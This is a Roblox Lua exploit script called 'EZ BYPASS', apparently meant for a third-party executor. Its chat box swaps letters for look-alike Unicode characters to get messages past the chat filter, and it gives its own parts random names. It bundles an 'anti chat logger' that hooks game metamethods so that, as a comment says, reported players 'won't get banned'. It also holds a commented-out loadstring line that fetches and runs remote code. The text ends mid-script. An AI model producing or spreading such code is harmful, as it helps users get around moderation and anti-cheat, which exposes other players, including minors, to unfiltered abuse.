--[[

Made only by ._.kinzin 👻

]]

-- Instances: 43 | Scripts: 24 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.EZBYPASS
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[RKJSWNFHSBFBSG]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.EZBYPASS.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["2"]["Size"] = UDim2.new(0, 360, 0, 274);
G2L["2"]["Position"] = UDim2.new(0.35915, 0, 0.31025, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.EZBYPASS.Frame.Frame
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
G2L["3"]["Size"] = UDim2.new(0, 360, 0, 31);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.EZBYPASS.Frame.Frame.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["3"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextSize"] = 27;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Size"] = UDim2.new(0, 133, 0, 31);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Text"] = [[EZ BYPASS]];


-- StarterGui.EZBYPASS.Frame.Frame.TextLabel.SetName
G2L["5"] = Instance.new("LocalScript", G2L["4"]);
G2L["5"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.Frame.TextButton
G2L["6"] = Instance.new("TextButton", G2L["3"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["TextSize"] = 27;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Fondamento.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 37, 0, 31);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[X]];
G2L["6"]["Position"] = UDim2.new(0.89722, 0, 0, 0);


-- StarterGui.EZBYPASS.Frame.Frame.TextButton.SetName
G2L["7"] = Instance.new("LocalScript", G2L["6"]);
G2L["7"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.Frame.TextButton.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.EZBYPASS.Frame.Frame.ImageLabel
G2L["9"] = Instance.new("ImageLabel", G2L["3"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["9"]["Image"] = [[http://www.roblox.com/asset/?id=101854654]];
G2L["9"]["Size"] = UDim2.new(0, 38, 0, 30);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Position"] = UDim2.new(0.36944, 0, 0.03226, 0);


-- StarterGui.EZBYPASS.Frame.Frame.ImageLabel.SetName
G2L["a"] = Instance.new("LocalScript", G2L["9"]);
G2L["a"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.Frame.SetName
G2L["b"] = Instance.new("LocalScript", G2L["3"]);
G2L["b"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.TextBox
G2L["c"] = Instance.new("TextBox", G2L["2"]);
G2L["c"]["CursorPosition"] = -1;
G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextColor3"] = Color3.fromRGB(179, 179, 179);
G2L["c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(108, 108, 108);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["ClearTextOnFocus"] = false;
G2L["c"]["PlaceholderText"] = [[EZ BYPASS THE BEST CHAT BYPASS]];
G2L["c"]["Size"] = UDim2.new(0, 247, 0, 179);
G2L["c"]["Position"] = UDim2.new(0.01667, 0, 0.13504, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[]];


-- StarterGui.EZBYPASS.Frame.TextBox.Frame
G2L["d"] = Instance.new("Frame", G2L["c"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
G2L["d"]["Size"] = UDim2.new(0, 246, 0, 179);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["BackgroundTransparency"] = 0.85;


-- StarterGui.EZBYPASS.Frame.A
G2L["e"] = Instance.new("Frame", G2L["2"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Size"] = UDim2.new(0, 107, 0, 179);
G2L["e"]["Position"] = UDim2.new(0.70278, 0, 0.13504, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Name"] = [[A]];
G2L["e"]["BackgroundTransparency"] = 1;


-- StarterGui.EZBYPASS.Frame.A.A
G2L["f"] = Instance.new("TextButton", G2L["e"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextColor3"] = Color3.fromRGB(187, 187, 187);
G2L["f"]["TextStrokeColor3"] = Color3.fromRGB(187, 187, 187);
G2L["f"]["TextSize"] = 40;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f"]["Size"] = UDim2.new(0, 99, 0, 50);
G2L["f"]["Name"] = [[A]];
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[SEND]];
G2L["f"]["Position"] = UDim2.new(0.07477, 0, 0, 0);


-- StarterGui.EZBYPASS.Frame.A.A.UITextSizeConstraint
G2L["10"] = Instance.new("UITextSizeConstraint", G2L["f"]);
G2L["10"]["MaxTextSize"] = 40;
G2L["10"]["MinTextSize"] = 40;


-- StarterGui.EZBYPASS.Frame.A.TextButton
G2L["11"] = Instance.new("TextButton", G2L["e"]);
G2L["11"]["TextWrapped"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextColor3"] = Color3.fromRGB(187, 187, 187);
G2L["11"]["TextStrokeColor3"] = Color3.fromRGB(187, 187, 187);
G2L["11"]["TextSize"] = 36;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["11"]["RichText"] = true;
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11"]["Size"] = UDim2.new(0, 99, 0, 50);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[CLEAR]];
G2L["11"]["Position"] = UDim2.new(0.07477, 0, 0.35754, 0);


-- StarterGui.EZBYPASS.Frame.A.TextButton.UITextSizeConstraint
G2L["12"] = Instance.new("UITextSizeConstraint", G2L["11"]);
G2L["12"]["MaxTextSize"] = 36;
G2L["12"]["MinTextSize"] = 36;


-- StarterGui.EZBYPASS.Frame.A.TextButton.SetName
G2L["13"] = Instance.new("LocalScript", G2L["11"]);
G2L["13"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.A.TextButton
G2L["14"] = Instance.new("TextButton", G2L["e"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextColor3"] = Color3.fromRGB(187, 187, 187);
G2L["14"]["TextStrokeColor3"] = Color3.fromRGB(187, 187, 187);
G2L["14"]["TextSize"] = 12;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["14"]["RichText"] = true;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["14"]["Size"] = UDim2.new(0, 99, 0, 50);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[FART]];
G2L["14"]["Position"] = UDim2.new(0.07477, 0, 0.72067, 0);


-- StarterGui.EZBYPASS.Frame.A.TextButton.UITextSizeConstraint
G2L["15"] = Instance.new("UITextSizeConstraint", G2L["14"]);
G2L["15"]["MaxTextSize"] = 36;
G2L["15"]["MinTextSize"] = 28;


-- StarterGui.EZBYPASS.Frame.A.TextButton.SetName
G2L["16"] = Instance.new("LocalScript", G2L["14"]);
G2L["16"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.A.TextButton.LocalScript
G2L["17"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido
G2L["18"] = Instance.new("Sound", G2L["14"]);
G2L["18"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["18"]["Name"] = [[Peido]];
G2L["18"]["SoundId"] = [[rbxassetid://7039305222]];


-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.SetName
G2L["19"] = Instance.new("LocalScript", G2L["18"]);
G2L["19"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.Sound
G2L["1a"] = Instance.new("LocalScript", G2L["18"]);
G2L["1a"]["Name"] = [[Sound]];


-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.Sound.SetName
G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
G2L["1b"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.TextLabel
G2L["1c"] = Instance.new("TextLabel", G2L["2"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 248, 0);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["RichText"] = true;
G2L["1c"]["Size"] = UDim2.new(0, 98, 0, 16);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Made by ._.kinzin]];
G2L["1c"]["Position"] = UDim2.new(0.725, 0, 0.94161, 0);


-- StarterGui.EZBYPASS.Frame.TextLabel.UIStroke
G2L["1d"] = Instance.new("UIStroke", G2L["1c"]);
G2L["1d"]["Thickness"] = 0.4;


-- StarterGui.EZBYPASS.Frame.TextLabel.SetName
G2L["1e"] = Instance.new("LocalScript", G2L["1c"]);
G2L["1e"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.SetName
G2L["1f"] = Instance.new("LocalScript", G2L["2"]);
G2L["1f"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.UIDrag
G2L["20"] = Instance.new("LocalScript", G2L["2"]);
G2L["20"]["Name"] = [[UIDrag]];


-- StarterGui.EZBYPASS.Frame.UIDrag.SetName
G2L["21"] = Instance.new("LocalScript", G2L["20"]);
G2L["21"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.Main
G2L["22"] = Instance.new("LocalScript", G2L["2"]);
G2L["22"]["Name"] = [[Main]];


-- StarterGui.EZBYPASS.SetName
G2L["23"] = Instance.new("LocalScript", G2L["1"]);
G2L["23"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.SetCore
G2L["24"] = Instance.new("LocalScript", G2L["1"]);
G2L["24"]["Name"] = [[SetCore]];


-- StarterGui.EZBYPASS.SetCore.SetName
G2L["25"] = Instance.new("LocalScript", G2L["24"]);
G2L["25"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Notify
G2L["26"] = Instance.new("LocalScript", G2L["1"]);
G2L["26"]["Name"] = [[Notify]];


-- StarterGui.EZBYPASS.Notify.SetName
G2L["27"] = Instance.new("LocalScript", G2L["26"]);
G2L["27"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Peido
G2L["28"] = Instance.new("Sound", G2L["1"]);
G2L["28"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["28"]["Name"] = [[Peido]];
G2L["28"]["SoundId"] = [[rbxassetid://7039305222]];


-- StarterGui.EZBYPASS.Peido.SetName
G2L["29"] = Instance.new("LocalScript", G2L["28"]);
G2L["29"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Peido.Sound
G2L["2a"] = Instance.new("LocalScript", G2L["28"]);
G2L["2a"]["Name"] = [[Sound]];


-- StarterGui.EZBYPASS.Peido.Sound.SetName
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);
G2L["2b"]["Name"] = [[SetName]];


-- StarterGui.EZBYPASS.Frame.Frame.TextLabel.SetName
local function C_5()
local script = G2L["5"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_5);
-- StarterGui.EZBYPASS.Frame.Frame.TextButton.SetName
local function C_7()
local script = G2L["7"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_7);
-- StarterGui.EZBYPASS.Frame.Frame.TextButton.LocalScript
local function C_8()
local script = G2L["8"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Enabled = false
	end)
end;
task.spawn(C_8);
-- StarterGui.EZBYPASS.Frame.Frame.ImageLabel.SetName
local function C_a()
local script = G2L["a"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_a);
-- StarterGui.EZBYPASS.Frame.Frame.SetName
local function C_b()
local script = G2L["b"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_b);
-- StarterGui.EZBYPASS.Frame.A.TextButton.SetName
local function C_13()
local script = G2L["13"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_13);
-- StarterGui.EZBYPASS.Frame.A.TextButton.SetName
local function C_16()
local script = G2L["16"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_16);
-- StarterGui.EZBYPASS.Frame.A.TextButton.LocalScript
local function C_17()
local script = G2L["17"];
	print("Hello world!")
	
end;
task.spawn(C_17);
-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.SetName
local function C_19()
local script = G2L["19"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_19);
-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.Sound
local function C_1a()
local script = G2L["1a"];
	script.Parent.Parent.MouseButton1Click:Connect(function()
	script.Parent.Volume = 10
		script.Parent:Play()
		end)
end;
task.spawn(C_1a);
-- StarterGui.EZBYPASS.Frame.A.TextButton.Peido.Sound.SetName
local function C_1b()
local script = G2L["1b"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_1b);
-- StarterGui.EZBYPASS.Frame.TextLabel.SetName
local function C_1e()
local script = G2L["1e"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_1e);
-- StarterGui.EZBYPASS.Frame.SetName
local function C_1f()
local script = G2L["1f"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_1f);
-- StarterGui.EZBYPASS.Frame.UIDrag
local function C_20()
local script = G2L["20"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_20);
-- StarterGui.EZBYPASS.Frame.UIDrag.SetName
local function C_21()
local script = G2L["21"];
	local function gerarNomeAleatorio(tamanho)
		local caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local nome = ""
		for i = 1, tamanho do
			local indice = math.random(1, #caracteres)
			nome = nome .. caracteres:sub(indice, indice)
		end
		return nome
	end
	
	script.Parent.Name = gerarNomeAleatorio(10)
	script.Name = gerarNomeAleatorio(10)
end;
task.spawn(C_21);
-- StarterGui.EZBYPASS.Frame.Main
local function C_22()
local script = G2L["22"];
	local box = script.Parent.TextBox
	local function sending()
		local TextChatService = game:GetService("TextChatService")
		local Players = game:GetService("Players")
	
		local function sendMessage(msg)
			local player = Players.LocalPlayer
			if TextChatService.ChatInputBarConfiguration.TargetTextChannel then
				TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
			end
		end
		sendMessage(box.Text)
	end
	
	local function convertText()
		local text = box.Text
		local convertedText = ""
	
		local conversionTableUpper = {
			A = "Ạ", B = "Ḅ", C = "C", D = "Ḍ", E = "Ẹ",
			F = "F", G = "Ģ", H = "Ḥ", I = "Ị", J = "J",
			K = "Ḳ", L = "Ḷ", M = "Ṃ", N = "Ṇ", O = "Ọ",
			P = "Р", Q = "Q", R = "Ṛ", S = "Ṣ", T = "Ṭ",
			U = "Ụ", V = "Ṿ", W = "Ẉ", X = "Ẋ", Y = "Ỵ", Z = "Ẓ"
		}
	
		local conversionTableLower = {
			a = "ạ", b = "ḅ", c = "c", d = "ḍ", e = "ẹ",
			f = "f", g = "ɡ", h = "ḥ", i = "ị", j = "ј",
			k = "ḳ", l = "ḷ", m = "ṃ", n = "ṇ", o = "ọ",
			p = "р", q = "q", r = "ṛ", s = "ṣ", t = "ṭ",
			u = "ụ", v = "ṿ", w = "ẉ", x = "ẋ", y = "ỵ", z = "ẓ", ["|"] = "\r",
		}
	
		for char in text:gmatch(".") do
			local convertedChar = conversionTableUpper[char] or conversionTableLower[char] or char
			convertedText = convertedText .. convertedChar .. "͎"
		end
	
		box.Text = convertedText
	end
	local send = script.Parent.A.A
	send.MouseButton1Click:connect(function()
		convertText()
		sending()
		box.Text = ""
	end)
	
	local playerName = game.Player.LocalPlayer
	local function updateChatLogs(message)
	end
	
	local TextChatService = game:GetService("TextChatService")
	
	TextChatService.OnIncomingMessage = function(textChatMessage)
		local playerName = textChatMessage.TextSource.Name
		local messageContent = textChatMessage.Text
		updateChatLogs(playerName .. ": " .. messageContent)
	end
	
	-- This basically makes roblox unable to log your chat messages sent in-game. Meaning if you get reported for saying something bad, you won't get banned!
	-- Store the loadstring (line 5) in your autoexec folder into a text/lua file to receive automatic updates [remove the "--"" part when you paste it into the text file]
	-- Credits: AnthonyIsntHere
	
	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
	
	-- 4/1/2023 - Rewritten
	-- 4/4/2023 - Fixed scrollbar visibility issue
	-- 4/15/2023 - Fixed Adonis anti-cheat kicking issue
	-- 4/26/2023 - Fixed tick loaded format
	-- 4/28/2023 - Added support for Fluxus users (hookmetamethod issue seems to have gotten fixed)
	-- 6/14/2023 - Added support for Evon users (checkcaller isuse)
	-- 7/7/2023 - Added support for Valyse users "FLAG IS NOT EXIST" LMFAO
	-- 7/22/2023 - Added global for universal scripts (mainly chat bypasses)
	-- 8/24/2023 - Now supports Player.Chatted signal event for clientside (highly requested)
	-- 8/25/2023 - Fully fixed (i was high when editing it yesterday sorry guys)
	-- 9/1/2023 - Fixed issue with /e command not working sometimes (mainly when joining a game)
	
	if not game:IsLoaded() then
		game.Loaded:wait()
	end
	
	task.wait(5)
	
	local ACL_LoadTime = tick()
	local NotificationTitle = "Anthony's ACL"
	
	local OldCoreTypeSettings = {}
	local WhitelistedCoreTypes = {
		"Chat",
		"All",
		Enum.CoreGuiType.Chat,
		Enum.CoreGuiType.All
	}
	
	local OldCoreSetting = nil
	
	local CoreGui = game:GetService("CoreGui")
	local StarterGui = game:GetService("StarterGui")
	local TweenService = game:GetService("TweenService")
	local TextChatService = game:GetService("TextChatService")
	local Players = game:GetService("Players")
	
	local Player = Players.LocalPlayer
	
	local Notify = function(_Title, _Text , Time)
		StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
	end
	
	local Tween = function(Object, Time, Style, Direction, Property)
		return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
	end
	
	local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
		if not PlayerGui then
			local Timer = tick() + 5
			repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui") or (tick() > Timer)
			PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") or false
			if not PlayerGui then
				return Notify(NotificationTitle, "Failed to find PlayerGui!", 10)
			end
		end
	end
	
	if getgenv().AntiChatLogger then
		return Notify(NotificationTitle, "Anti Chat & Screenshot Logger already loaded!", 15)
	else
		getgenv().AntiChatLogger = true
	end
	
	local Metatable = getrawmetatable(StarterGui)
	setreadonly(Metatable, false)
	
	local MessageEvent = Instance.new("BindableEvent")
	
	if hookmetamethod then
		local CoreHook do
			CoreHook = hookmetamethod(StarterGui, "__namecall", newcclosure(function(self, ...)
				local Method = getnamecallmethod()
				local Arguments = {...}
	
				if self == StarterGui and not checkcaller() then
					if Method == "SetCoreGuiEnabled" then
						local CoreType = Arguments[1]
						local Enabled = Arguments[2]
	
						if table.find(WhitelistedCoreTypes, CoreType) and Enabled == false then -- Thanks Harun for correcting me on the second argument
							OldCoreTypeSettings[CoreType] = Enabled
							return
						end
					elseif Method == "SetCore" then
						local Core = Arguments[1]
						local Connection = Arguments[2]
	
						if Core == "CoreGuiChatConnections" then
							OldCoreSetting = Connection
							return
						end
					end
				end
	
				return CoreHook(self, ...)
			end))
		end
	
		if not getgenv().ChattedFix then
			getgenv().ChattedFix = true
	
			local ChattedFix do
				ChattedFix = hookmetamethod(Player, "__index", newcclosure(function(self, index)
					if self == Player and tostring(index):lower():match("chatted") and MessageEvent.Event then
						return MessageEvent.Event
					end
	
					return ChattedFix(self, index)
				end))
			end
	
			local AnimateChattedFix = task.spawn(function()
				local ChattedSignal = false
	
				for _, x in next, getgc() do
					if type(x) == "function" and getfenv(x).script ~= nil and tostring(getfenv(x).script) == "Animate" then
						if islclosure(x) then
							local Constants = getconstants(x)
	
							for _, v in next, Constants do
								if v == "Chatted" then
									ChattedSignal = x
								end
							end
						end
					end
				end
	
				if ChattedSignal then
					ChattedSignal()
				end
			end)
		end
	end
	
	local EnabledChat = task.spawn(function()
		repeat
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
			task.wait()
		until StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
	end)
	
	local WarningGuiThread = task.spawn(function()
		WarningUI = Instance.new("ScreenGui")
		Main = Instance.new("Frame")
		BackgroundHolder = Instance.new("Frame")
		Background = Instance.new("Frame")
		TopBar = Instance.new("Frame")
		UIGradient = Instance.new("UIGradient")
		TitleHolder = Instance.new("Frame")
		Title = Instance.new("TextLabel")
		Holder = Instance.new("Frame")
		UIListLayout = Instance.new("UIListLayout")
		Reason_1 = Instance.new("TextLabel")
		Reason_2 = Instance.new("TextLabel")
		Reason_3 = Instance.new("TextLabel")
		WarningText = Instance.new("TextLabel")
		Exit = Instance.new("TextButton")
		ImageLabel = Instance.new("ImageLabel")
	
		WarningUI.Enabled = false
		WarningUI.Name = "WarningUI"
		WarningUI.Parent = CoreGui
	
		Main.Name = "Main"
		Main.Parent = WarningUI
		Main.AnchorPoint = Vector2.new(.5, .5)
		Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Main.BackgroundTransparency = 1
		Main.Position = UDim2.new(.5, 0, .5, 0)
		Main.Size = UDim2.new(0, 400, 0, 400)
	
		BackgroundHolder.Name = "BackgroundHolder"
		BackgroundHolder.Parent = Main
		BackgroundHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		BackgroundHolder.BackgroundTransparency = .25
		BackgroundHolder.BorderSizePixel = 0
		BackgroundHolder.Size = UDim2.new(1, 0, 1, 0)
	
		Background.Name = "Background"
		Background.Parent = BackgroundHolder
		Background.AnchorPoint = Vector2.new(.5, .5)
		Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Background.BorderSizePixel = 0
		Background.Position = UDim2.new(.5, 0, .5, 0)
